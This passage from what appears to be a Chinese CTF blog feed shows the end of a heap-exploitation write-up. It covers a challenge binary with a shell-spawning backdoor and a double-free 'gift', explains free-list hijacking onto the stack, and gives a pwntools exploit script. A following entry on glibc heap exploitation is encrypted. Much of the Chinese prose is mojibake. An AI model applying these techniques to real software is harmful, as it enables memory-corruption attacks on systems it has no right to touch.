class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> *argv[] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">exec(<span class="string">&quot;sh&quot;</span>, argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (chance) &#123;</span><br><span class="line"><span class="keyword">if</span> (record)</span><br><span class="line"><span class="built_in">free</span>(record);</span><br><span class="line">record = <span class="number">0</span>;</span><br><span class="line">chance = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">banner();</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">switch</span> (choice) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">delete();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">gift();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™å‡ºçš„<code>backdoor</code>ï¼Œè€Œä¸”<code>gitf</code>å‡½æ•°åˆ™æ˜¯ç›´æ¥é€äº†ä¸€æ¬¡<code>double free</code><br>ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥<code>double free</code>ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªåŸå› ï¼š</p><ul><li>è§‚å¯Ÿåˆ°<code>free</code>å‡½æ•°å‰é¢ä¼šæœ‰ä¸€ä¸ªå¾ªç¯éå†</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">  <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœç›´æ¥<code>double free</code>ä¼šç›´æ¥åœ¨è¿™é‡Œè¿›å…¥æ­»å¾ªç¯</p><ul><li><code>ptr</code>æŒ‡é’ˆåœ¨<code>heap</code>çš„å¤´éƒ¨å‰<code>8</code>ä¸ªå­—èŠ‚ï¼Œç›´æ¥<code>double free</code>å¹¶ä¸èƒ½å¯¹èµ·åšä»»ä½•ä¿®æ”¹</li></ul><p>æ‰€ä»¥å¯ä»¥é€‰æ‹©å å †åé€ æˆå †æº¢å‡ºæ‰æœ‰æœºä¼šä¿®æ”¹<code>ptr</code>æŒ‡é’ˆ</p><p>å› ä¸ºè¿™é‡Œçš„å †å—åˆå¹¶æ¡ä»¶éå¸¸ç®€å•ï¼Œæ‰€ä»¥é€ å †å ä¹Ÿå¾ˆç®€å•ï¼Œå…ˆ<code>free</code>ä¸¤ä¸ªç›¸é‚»çš„å †å—è®©ä»–ä»¬åˆå¹¶ï¼ˆä¸‹æ–‡ç§°è¿™ä¸¤ä¸ªå †å—ä¸­ä½åœ°å€çš„å †å—ä¸º<code>a</code>ï¼Œé«˜åœ°å€çš„ä¸º<code>b</code>ï¼‰ï¼Œåˆå¹¶åè¡¨å¤´<code>freep</code>å˜ä¸ºåˆšåˆšé‡Šæ”¾çš„<code>a</code>ï¼Œç„¶å<code>double free</code>å †å—<code>b</code>ï¼Œè¿™ä¸ªæ—¶å€™å› ä¸ºè¡¨å¤´æ˜¯<code>a</code>ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡å¾ªç¯å°±æ»¡è¶³ <code>if(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</code> çš„æ¡ä»¶é€€å‡ºå¾ªç¯ï¼Œè¿™æ—¶åˆå› ä¸º<code>b</code>ä¸ä¹‹å‰<code>a</code>ä¸ç›¸é‚»ï¼ˆåˆå¹¶åå †å—<code>a</code>çš„<code>size</code>å·²è¢«ä¿®æ”¹ä¸ºåˆå¹¶åçš„å¤§å°ï¼‰ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘åˆå¹¶ï¼Œè€Œæ˜¯å°†<code>b</code>ç›´æ¥é“¾å…¥é“¾è¡¨ã€‚ç°åœ¨åªéœ€è¦å°†<code>a</code>ç”³è¯·å‡ºæ¥ï¼Œå°±å¯ä»¥å †å åˆ°<code>b</code>è¿›è¡Œéæ³•å†™å…¥ä¿®æ”¹<code>free</code>é“¾è¡¨ä¸Šå †å—<code>b</code>çš„<code>s.ptr</code>ã€‚å› ä¸ºä¹‹å‰åˆå¹¶çš„æ—¶å€™<code>freep</code>è¢«èµ‹å€¼ä¸ºäº†å †å—<code>a</code>ï¼Œè€Œ<code>malloc</code>éå†æ˜¯ä»<code>freep-&gt;s.ptr</code>å¼€å§‹éå†çš„ï¼Œä¸ºäº†ç®€åŒ–åˆ©ç”¨æ¨¡å‹ï¼Œå¯ä»¥å†<code>free</code>ä¸€ä¸ªä½äºä»¥ä¸Šä¸¤ä¸ªä¸”ä¸ç›¸é‚»çš„å †å—æ¥æ›´æ–°<code>freep</code>ï¼Œå°†<code>freep-&gt;s.ptr</code>å˜æˆå †å—<code>a</code>ï¼Œç„¶åä¸‹æ¬¡<code>malloc</code>çš„æ—¶å€™å°±ä¼šä»<code>a</code>å¼€å§‹éå†ã€‚è¿™æ—¶ç”³è¯·å‡º<code>size</code>ä¸º<code>a+b</code>å †å—å°±å¯ä»¥æŠŠä¹‹å‰çš„<code>a</code>ç”³è¯·å‡ºæ¥ï¼Œåˆ©ç”¨å †å å†™<code>b-&gt;s.ptr</code>ä¸ºç›®æ ‡åœ°å€<code>addr</code>ï¼Œå†è¿ç»­åˆ†é…ä¸¤æ¬¡ï¼ˆå…ˆè¦æŠŠ<code>b</code>ç»™ç”³è¯·å‡ºæ¥ï¼‰ï¼Œ<code>malloc</code>å°±ä¼šå°è¯•å°†<code>addr</code>åˆ†é…å‡ºå»ï¼Œè¿™æ—¶å¦‚æœ<code>addr</code>åˆæ³•ï¼ˆåœ°å€åˆæ³•ä¸”<code>size</code>ç¬¦åˆè¦æ±‚ï¼‰å°±ä¼šè¿”å›<code>addr</code>ï¼Œåˆ°è¿™ä¸€æ­¥å°±å®Œæˆäº†å®¹æ˜“åœ°å€åˆ†é…<br>è‡³äºåˆ†é…åˆ°å“ªï¼Œå› ä¸ºç¨‹åºæ˜¯é™æ€é“¾æ¥çš„ï¼Œæ²¡<code>got</code>è¡¨å¯æ‰“ï¼Œæ²¡åŠ¨æ€åº“ä¸­çš„<code>hook</code>å’Œ<code>glibc</code>ä¸­çš„ç»å…¸<code>io</code>å¯æ‰“ï¼Œä¹Ÿæ²¡ä»€ä¹ˆç°æˆçš„å‡½æ•°æŒ‡é’ˆå¯ä»¥åˆ©ç”¨ã€‚æ‰€ä»¥è€ƒè™‘åˆ†é…åˆ°æ ˆä¸ŠåŠ«æŒè¿”å›åœ°å€åˆ°åé—¨ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰<code>ASLR</code>åŠŸèƒ½ï¼ˆå…¶å®å‡ºé¢˜äººå‡ºåˆ°ä¸€åŠçœ‹åˆ°äº†ä¸€ç¯‡<code>xv6</code>å®ç°<code>ASLR</code>åŠŸèƒ½çš„è®ºæ–‡ï¼Œä½†å› ä¸ºæ—¶é—´æ¯”è¾ƒä»“ä¿ƒæ‰€ä»¥æ²¡æœ‰æŠŠ<code>ASLR</code>åŠ ä¸Šäº†ï¼Œä¹Ÿç®—æ˜¯å˜ç›¸é™ä½äº†éš¾åº¦å§ï¼‰ï¼Œå¯ä»¥é€šè¿‡è°ƒè¯•æ‰¾åˆ°å›ºå®šçš„æ ˆå¸§åœ°å€æ¥åŠ«æŒ<code>add</code>å‡½æ•°çš„è¿”å›åœ°å€ã€‚æœ€åå°±æ˜¯å› ä¸º<code>malloc</code>å‡½æ•°ä¸­è¦<code>size</code>æ»¡è¶³è¦æ±‚æ‰èƒ½å°†ç›®æ ‡åœ°å€<code>addr</code>åˆ†é…å‡ºå»ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥è€ƒè™‘åˆ©ç”¨<code>add</code>å‡½æ•°çš„å±€éƒ¨æ ˆä¸Šå˜é‡<code>size</code>å’Œ<code>idx</code>æ¥æ„é€ åˆæ³•çš„<code>size</code>å°†<code>addr</code>åˆ†é…å‡ºå»ï¼Œè¿™é‡Œç”¨çš„æ˜¯<code>idx</code>ï¼ˆ<code>idx</code>æœ€åä¸º<code>3</code>ï¼Œå¯ä»¥é€šè¿‡ <code>malloc(0x20)</code> åˆ†é…ï¼‰</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;3. ???\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">gift()</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x3fa4</span>))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p64(<span class="number">0x2da</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é«˜ç‰ˆæœ¬glibcå †åˆ©ç”¨ç¬”è®°</title>
      <link href="/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c2e10090e128f7e3054c3a40d1280866bf405cf529b60eab97791c3036808b28">e804cc0693c1a47edb264b2c8ccc5cb72c6f8ebf92638d7d0f9db5f77f9ad6cb8edc31efcdbbe1cbbf0d524650af5861543b33fecaab8cf777d16aa6abf2649ed580d52c551fe8bdfe70c633e6e09025c97df29a62ef7ff5296b0c8d411e326cfa97d0447444fc4277bd1078f723c56b08354b3fa533db963c8040f40c95af5d562ee644eeaaefd6b6d89633703ce432a236ca9c04fe5ab85228052475793342b044354f64fb6a2635c0c45fbcfc38e8ab848b9bf07e7219630c4f33cb4206c83c33982f82c12865b1b22f65dccba3c0f81ae3d890b8d08627dd4fc277248b13bee04bcb1a0b7074d841e901bf3f8cccb666e2382e8d958790300a560c14ceeec82ce83b68f938d2acc367c3e83db2e7272f49034a7bc3de3b3ea03bd155b7ba92b9ba1cdf2f2eeec992fc2cf9a4e07839a02304c99bfefdf32a2a250d53c0070d6bd43ed82d14f33162b68f9e2da58ac783bffc98c670a42454f31b7e799c3d76c67d1788a2ff07dbe2dff072d9ec5532bac185546a1ebc51cc8a327b6c6ee413bb2e6d0afa072b5dbb744a2bc8cf4bc699df0a15c2b24476d5cb4669e334cf15ba1dc0302be09af3abc1b871820675428f0656e366492f5628b81d54790e3482158be3231e950a3d03d882b4814fc025a7c6b58e0750ce6e981584447be835f821eeb52fff72dbcd487d0b691cdbcc7b4d9bb078ab072404b73595b3b9f511d9e3220933e67f85b3333fbc54f5f07fbc64220c6c81db5284e5d876419f5ff2e9f762c3263aa0594d4a8c09bff4e78e842f2bbb67003a10ff42531e18f3c55d941726487cd17c63a41d7a2f0c820d6647fdb6dcad9833c1dda0b1de2da71431042b5ecee7c5b95b360b410f6a8fbbb9ed954a32e247d994cfbe83cd853815e6f4b9afa70582e313a364e853c6797e4b7506df4a2ce37ee794d8b61de3a6977d6a43edfd67938bd6f14b5fce73aea29b789b33cf7f94615049320eec6b0a0b820b55be72fbc450a5705cca8d5263e2d20fe1bf73c04249b79ad04b08ec58a9443ff3e0e7eb65991ebf06c4906d831733f0c301967a160348798ac6c7209f0964cf5cb8a44dc68080afc189a38ef8d02921ff756a32a603fc61be6ea227c34633ed11d1111b5ef4ffd2e95db271e53e9193ef4598fab224d4a480951bc4916d4b291d0dbfdf217c492f11d0e9eff24a92e81319c06ccd2a5cd307e151817840149ee0361769209d2ba7428f5cd906f2ddb2b6eeedfc2d995674f7294ce9c1f01b41a5c645f3ab8046cf3cf0dce64fd78743315b146ad7c2ce11f6d3dcdf55e3141ae8d8db604022534b4a443ee10a36494941e0f9b305fe0942733a4ddfbed048a171d918991f5d18b7ed4f63c0f10e06018b08b5fa2912cd7b7e7c3d224472cd4fc94fba9c3cb784985183c86f629b6ce8c6fb49422ded3af8f660f5046d04c3c13aedf1328d56a8f48b4cd04baad827d84aa707ca4f7f94e4094780b453f0e02cc5308950c7eb5b7a6e88ffac88336201dccabb6d8c1f6efe0575b8d5c4cd75d28449b913131a0d136170b9d09fdcb0a39593eef22b5c0cf942ee2d3d2e0129bb1f6eef88aed844523526a86995af2f286250a0473f9df089fc420de9782f705c02cca9aa527488e951911e4b0c54b7f1b663d9822779cb9f928cefe9abe80e1a8f6a5a15951bc880923c84a73460da5f75dea0dcbc7db5e435b3dcfe1ccd0b7a1af3cbc6bde1c6b408f1c0d3ff5b4808372286dc0bc86d50585f29b52477b0d53ee7b1d1202062bfe93c35ca7e6955df0e97ccffd466f33a44d111de25d3365e4ab97bb6dfdb328b9b31cd211794b69c51cc89f9a84e8f794ebf3257c01e1634246c4927e3acc8633c11dc7ef677690157a1f5870c52ddc3de72b20a92e6c2cdc3efa85ff30f8d90753aca32d2b7bda3f72826393acc6913621df4e94e91a77cbee1b0cdc6b48d7a60ad81faf604042954253a28a3ec7e997ea7a68c13a114e154bcb251ef2bc5bfea46c2b3f6d9bcbe889bb71b68c2ea040aac10e49aa1a67ed58e65b49619c08ef39b4e153ebc308f609b5a7fae3c3bbbfdd613c98a92ff76862fe35b7ec8d85c325214da620983023c3c92aa192176fc67aa0f0a2a78d14338ee8e6ae0fc0e89d8ab47dce9ccede71ad42c5b8e84b8e5c68fc1d7ba026751d3bd9ab35c64df3c04e40229aed3d47a583ab14fbb47ca3bec5e11fb7784487c65159429ee1e4bfcfc58000ba068f43b939137a95e4f64be5472ccf537d1d095f5b3a69999f5d01891a9406c07197eba7e816c809f1ba67725624ced0c7a94c2db16b8e811bb942e21c11025ac4def3963a2bea5cfb2922270aaba34229d1d2a497a5b7389e8513395f2101fe2b9a541f8f4b3e0c37cdbf063b3fd92d010cdecb79a1237847369987a0d434b39967dba994fd5d7eb555198a626d96dbffea6af1c90847318f91bd27422798b66f408dd953d29e310589de9dde9c98677401307f2f3b21cc5bf9026d2fbf13deb478a556b34da91aad8a3fd087f9b19c60c530c465fd00390ddde2b1b6900e0a1913238c464c5d0b7fd0389c016846ce3f2c3a12c9ac12ec2c3367c7bb4d8d86081350f3308dd191cde7197e6e15baedbf883949b0481e38343d56a8302585e54347197ebe4277d6c8fbefe2de6dec95c7db24739386c47a1a5ed7762764d69704fec19b7db458818be32365cd7f6e7c4580bab77b29e93500b6c8fb0ee8f13903f48e21e1cbd7492c1ae0c4d04ec1334ccda891bc2166413ebf45c97ac0fd8b9faea7fbc06277e1e2dbcd37e580501252aae348146a0e0fbf356611a550cbb5623ff2d71208fed9c8b6f3496aa6cb1528359b57632de4d5d48014d364d84036c1afed36a409bd4f4f391d6c89782c159209451f7080a801b7f61b1470a862da2895833f9babfa2657d2481ba874b5e494c9a227e036fedd9f81c7fc1630f836596a9336e4b547b623198de0b9c9fcb32a8005915b92764f5b2c9ccc58d13f4247ba28bf9f794d4b310b34dd996ae0c5f8eff4d34b852bad874581310c4e0d7f88faa341f6fd542c14c3a0dc41e4d9679be0a962fe320b64c464fb05e614bbe3c396eadd8ed89b2ad34a90936c98c44ce6196a30f679ce6c95a64024cd5adb517b0a742281893144e08e4765d7ff3fdb9e41132323012717ac90e8dde3b02e2dfe4237ceda457327c2c31dc2aa8d55c687b0bd720cb5f63f8a294841b808c7dd311ec528259878ab29af59790f70e6ccca7e60d5acc5421a4017d41eb1113153f8eac148669a749710b99bb010a54f6dd1d06e965c609fff5c1731704e24bd651e8fab36c829150a8250e59612237108589620420b378d4a48ecbf06df6338949ab5555b5737b1d9c77267e50a43bae79a3444e0faefad421f5cd029ca2820f023e226bfd76857ce62e08b83bf91169a1e81da98179832954ed42bde0d9a3fdf732ae02a31674e5107d8cf5654947f28dd5cfea0cd411b5b21ff07b196e795f9682f185550cec484f1563e24ff0e0cafb9fbba2304895ec315de6d6a7b3acfdc5a42dac256193ed161c52a0036273b8421720f8db53bf66f5da2ff929ae6803d57a0b1938a329bfe7dad1c7fe28b8a12cc186357cb14ec6640930c71f0532d657153669b73bcc2c92f0148b9468777e1183487a4fa797d6524e07e29e0985d2eaca51c537c3285c3956fc9e62518fc94beb276f632562a6bec693fd00c68229acb4b82268ced4bb5d3dc990f0cfbf75bec9123a48a29bb8b285197c63685afa8f1192a108263a528e8d6697f06db8963d4919b5181fd07d4d6774c534be71b3605816ce36795424c86342a295d768815187b77a667fe305284488f608d347b5e02194b16dafd58beaa0222994057dd6f31471be68ba862a821d5c53ce8fd33aa2fcf48c9da7d575e9e48a838dd14436ad7bef600090e8e1c5543ace5a40198be8c5d56ac36bb862dd0b5334bc11f228c014e2b6029ac6709421f9085738eb2657e97a5ef994e2e636bc60391dd70ff507465172827e337beeb2d432df232c95d299f5e025d9c357492e44f86d3bcaa38e6d2df0a371ac7fbcb1d93a69ac3e1ac81bf7641c63b65e17cc2c4ce0d2354ebf0ba6789a630e401c52ae7450e519c28addf32de4594229fbe17b3a833e9eea89c596f21a3ce92a6601633fa4c9c4aab5af0c7fb61b2032cfd077de9b8d041e67112eca1bbdf3a1d6e344d20df3174332a1d8383444e7cd45e4903150420d88d79b9b78b9ad623a861d2ad3f08f379be9c9cf657773d81b498e96eef83346e17a44f2d52bf5c65aefacf7a4731113be24644c400f7629740a7e66033453f330de3dcd312d4d4f49650d0d748267cf447d5fdc8f10e0d9037bb5cdf22db9a7155800b42983352b6b919e14473493ccd133d0671ea36b48cc4c5540b7f27cde1b9f863bbda000bddc71e99cbae0002068f3463ef643002550a825ba8c76b313fdc121be6f2a7a9070e98004629d50bdee7ac2519ceb56e9c76f7f3405fab0b69a9307722f0ebcc1f8e195f9aee5f28bddfa3030c20f22431461af918eb85a652c2ef99c1c2f0615ffc4f0601edb18054e79e364c4981a6f0d7f0a5df8efaf1234b614198d8fa298c23c65410a3402c7e573d3a820cd40881c84cbcf535320005c6cd69ed12225c4d0372ed15168ab2f4dc3662514879b5bb98f868b1c5163029e14e86657d3261efee539c5a35bca88edf4c099f8edbf7b6b6fa7b6a7e06ff7e1942e60a681de8ca70bccf74d81dca4c2790a497b92304f9adbe6b399ea274d909a5c9bb91d081d982ebccb0f3d68f2385815b63a8553e85ba6b186ca72e1367aa49af397d9bccbada5d1af7f1cfe1a21f554dc49007dccfe055674e3d7f93a09caebe194356437f64fd8c98daf8f37f027b851e3d7642860399feab31b582379b44dbadb417eb3a6d9557b88f0ac078420cd43b394a2a02abf9f1227886a257df0c7ff50e6896a639faa35fd2e7dd1b932afbb7004a84b20abd674a18d7444baa4da1c7f6105a7678c6b411bdb7a88553b422015ffe872f075f66bcc6b7def67c84b7f83cfb9b5a187a8aa1ee63993c60ada5fde823d1250da8edc4dd0bde16cb3dace9d2f99e2f77d7a36f415e37ec26e527f9aafdf96814269eca46519a97891f499946650f7e43b9c7bb3feaadb5cdfddbc464120b28936f9c43482d5b79e204d40b6d1e7b0f5b5339f95f4c375ac8ceaf5babc2cb8b843c4ca6a220c40e29d42c2d75fbebf976cc8a00524b83ebb79f680250f6cd826e2b8e066d8961f261d4dcd914c57776c32395ea6440a327831962c62b3b54aa79983933db0b1ca3f7b31fa78bf7ed3ed3f8f7bc1083154870e4e5f1a00402e0293c94cf26291f21540aa4adc49b2e2bbd3af0c8698f3626edc519569d1e17a71af3ab90961bf7bcde37f95a1492740b914984becdbd1ee4a6dec9847b57d36876f98f573ddd43a20f0932eb374db4646679432dc913b1a7e935c1f38665f228fd778d4709c77c1df36265c909289d7038ae67efc679668e14946f194b6921b7878ae928b71d43b7294a05ab9a18be51f887f04e53102ef62309dddc173028c81591f30b0f6e7718a686b08bcfaf2e03a3acbfdb14404f25b8b262e2d0b71d0ea8597478fcdf61e450371ea20b6f3523e5391deec31a66342d240ac79cf6d91c0475de88d1c044cba322edd7611922aad71af20909f5e4965a0e2e101f1636c819d2161fd296ea383813c1c216a1b12d54c515c76e59a30d84ae1385ea326f437b28ad5c4cd60c70e8681dd5355f32cd789b4c18e6faaba83ac8e1df0f9cea45d585a5d7b5f4ec1305416291cb53da4935a6ed1ac609f6f23b2cc8e8241c03f0a257fb97c020dfe9d9b7e39f7dbde691377ef18315b0c06ffc537d3414907e68ddbc7b6b052ac589f57a9b8cbb88939d43049b75ae9bec9102bae37072c47de5109afc38a835003be8dc471eeccbddbc31dcb502df516994bc50119100c752ee61393e929da01bb89e52ad750dcda8247e6f1dd1c820e313f6b09f9b22cd58c96b68d26c41eef2320797d82c0904167e2cd6839284fe1e3074b71136be4a8977883a804657d86f6a80c5591aee7d4d22954ac0f907f0de3bf8e6ddc0cc78e2a263aec2ed156d8ad3b080b5831e8619b2442792472413751a4931d6d0e853f675b759e156d3e6ecfbfe25a58ef3403e9a5b3d38ec91487d8438f47d9cf5f91204be1168aff0c3d520d7c3e490d90eaa506897273a7d01ba8f94f7b74583f64858d03810caf20a16834a25dced8c61736cb9b502d54f7726be5bed6be6d91de657bab9d26da6882e62edab642f6bb64aa7ddac2bd70048a7018f42834c4861ae77f7cf24b60f43d3d1c6eb2aa15b8fec916bc0b277140f5934d08d758b187b420b7124ac11eb81ecaf01d60b5f86d2810a40f9883777702572322ce7e247fe16786cc40cba1d6baef3eeb01fc9fbf91c304785805c0c207d3712a6584adde19da82ac5724e978cb341b081bc3840dc347174e0332c4856173a9b68ca81b6f794fd0176366535dc30a12d4b404f7779ca332126c3be96bac5d1db282c24f13a198655e4fb0ae2d13c6e863c3183d08debe39628b3f1c19540f8bd3eacc4eddf5ea6859d20668bdccdf0f73f0bd897964607030f93a61d9578ad9b3129d005b63fa3bdf4e1c40e5ffe06680ae1f4d6440b0a286b7485c1378d286c6bdd76fd0486efd797c847a808d866737a12e92b04dd9614828d283c089facb14ff6b72ee8e0e3e1c7ec4a9c94ef400d6a0f5297d697d12acc6530aadcfef99a340b906a347988010f1d9acce8bf9298b2f753cca754e50a569623c8a1f85e3d05fdf3c0143d5ea3fa9cbef4a4d052ec584a9bb54391c1a14eb62dd12843d63498d6b8226289d03e6ee8ba80955b4506097a430b7618c7f96d9974acd55956352b4ae8d461eef0b0dc538d229c8f87012b03ea607bcc8f41dd59f58f38fc622def6f92380961b6b22abed9ea351037f7cc7994db32db7163cd16894a0d8cd654c2a8c201991f3bb0eb587fb8647a73f6a79b0e9951d0b2751f7301b6cc0a34a2145ef46cbebbef8c262c5e63c21ca38abde2efc96ac958c96c33431dce7e61b385bfb15455a8d994fd8e7ded7f9845a883eb1bec166345263de273e9183640cb9381afacff3779ba2f060ba8337f0e9c5f144d667cc9c5a92677d93861d8b5a7c48e19b72a33e57eae1029fa5871e00488eea6e96f71038f699ffe78ce4a05fb222be7d879d2e4565003a1ab33f4b956c1b9c27787e5634a55064cf85f110f5f63892dbb405a11091cf635e602df941ec98a62c55bb7e9e58e684745f1c40dcbcb9f251487fb2c00daf6fcd1dccdae0b1af25f42722b3225b1ac0f2d3b23fb694c8ff6095f463257e1b2875e00d441ccd045b9086412ab003d57e38fc79759cbc43d1d3b4540ca2cabd91e45d753a5a1bf3e0d6a4bdf5b1f4d57ec7fbb8f74c1649a22ebd9bf9a7fbb39d7033e81c84f2ef1ccfae8e7b646ede278863be0da8069a6e0e2f9ddce6809a9947c4b9082523cd7fc6a3fb669dc3b49f3970b85817095de1c199359bf9d22a7edf302a8c30a2c12014a6add06ab8a5fb51dc74abec27fe38971b5be4cc0683eb9e69213e8b97756be02b69ed9f5c79e77b37c28543952d066b932ee9b0871830b5f5894e3d7d8473cb2926a5ffc1eb1d114557de5858e40c76abe765d6d76c397c0625a81554af3953ebbb9f812fe38be532f9f7a110f0e5f109358a2da72fdadff538a8dbeab90fb0ddf9c16860d5e6018cf9ac04692c9f8a1557454abe6be694690f4b89e15e72f560c70c24384027155685e9c1c78af688691df262e757004d1f7ecaf7266eb0b93ce9226553eb50541e8653782976eb631b59de6bb4e9cdc3c58d2016ec4cd66c6c13e09f57c6ff5af2ca894d473677f8a8cfcc3fc62f3751c3cc3d2ba07c408e653653161ff7e2ff936359e0806a95d588366369bf4de511a8982dd7c6a72863d82568c639d5df2ca59af2d18fb3ccdcfc3c43163a1784113473883f044df6ffc9c2c4fea83fc5bd6247c25f9a4d5767250d02c3e252e092cf7714fd285470b6ab526970dbda47a49b3f6480bc328962f7e95fc4362e3d4c8b3a3a5d06df4267cc908c2b02159710aafbb23f6b6629838afe3c15634b90be0bb057c39145383e8b20262234fe603f779bc8cfd674270569e92fa4f60394e1af534e135c1b7a142d20adb3f6e833dc1c118c363fe4b60d39252fceaba74542d1b87e829cda6a679ca197be558b7c18de5988985b2f428a7a883dbe4c0446b5adac65b13e84ed1368011fa1cdc49abdbf08e83eb9eb483f56ed976f67d5d1f96c33a8262ea6ddab6a20f1dca7fb67c968c43e366254bc8b147b9379c9ff199b9589d5be2feee8ca40e78dba56638ee271a5b70b8be064b59d5a9aff135a3aa60fb291ff8271ac7c3054bce10191e266fc1a4196763bfb68e802c9a49864d1271ff168aeb1b9d12ad0c425f9bb12d579cd0e0ee2ec9f95189414849170d1916764dbc70e858fb558a8f1ae4409e91cfef9a8435a2b1809a0a761d2184bcc4ce0a5fccf704a852089ebbda5840b75fdc0068f19ac08b80548d94aeb6fd3d6b06be7a8863e4ab951d24bed7ea8c6955cac6837311d058ff0797286141599303029f02e3576ccd7162310ff07e3225608326671982bb29f0f5b127cc68e118adea7363bf74ec1dbb23d80e5098adba10940b1969e4b026da257aa501fdb95e1546d1f3019a8c0d6db4015551d0171b37cb89c6a7311b7dbe20c99184e59058b88ac4f92448d9a4af1a22c0b6cf9ab2eb9d0b1a4e1bec46052faa6d44ab9a683ead6560d9c8d006107a73bb47a91a866df167f91f463f46e38f84dd01ca2f5640231557d541badb44305728d9d65ac6b66